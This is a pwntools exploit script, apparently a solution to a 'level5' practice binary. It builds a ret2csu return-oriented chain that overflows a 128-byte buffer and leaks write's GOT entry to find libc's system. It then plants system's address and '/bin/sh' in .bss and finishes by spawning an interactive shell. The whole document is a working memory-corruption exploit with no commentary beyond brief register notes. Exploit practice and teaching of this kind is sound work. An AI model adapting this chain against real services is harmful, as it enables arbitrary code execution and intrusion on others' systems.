from pwn import *

context(os='linux',arch='amd64')

elf=ELF('level5')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
p=process('./level5')

init_addr=0x400606
func_addr=0x4005f0
got_write=elf.got['write']
got_read=elf.got['read']
main=0x400564
bss_addr=0x601028


system_offset=libc.symbols['write']-libc.symbols['system']


#write(rdi=1, rsi=write.got, rdx=8)
payload1='\x00'*128+'BBBBBBBB'+p64(init_addr)+p64(0)+p64(0)+p64(1)+p64(got_write)+p64(1)+p64(got_write)+p64(8)
payload1+=p64(func_addr)+'\x00'*56+p64(main)

p.recvuntil("Hello, World\n")
p.send(payload1)
sleep(3)
print "send payload1\n"
write_addr=u64(p.recv(8))
system_addr=write_addr-system_offset

p.recvuntil("Hello, World\n")

#read(rdi=0, rsi=bss_addr, rdx=16)
payload2='\x00'*128+'BBBBBBBB'+p64(init_addr)+p64(0)+p64(0)+p64(1)+p64(got_read)+p64(0)+p64(bss_addr)+p64(16)
payload2+=p64(func_addr)+'\x00'*56+p64(main)

p.send(payload2)
sleep(3)
print "send payload2\n"
p.send(p64(system_addr))
p.send("/bin/sh\0")
sleep(3)
print "please wait\n"
p.recvuntil("Hello, World\n")

#system(rdi = bss_addr+8 = "/bin/sh")
payload3='\x00'*128+'BBBBBBBB'+p64(init_addr)+p64(0)+p64(0)+p64(1)+p64(bss_addr)+p64(bss_addr+8)+p64(0)+p64(0)
payload3+=p64(func_addr)+'\x00'*56+p64(main)

sleep(3)
p.send(payload3)
print "send payload3\n"
p.interactive()
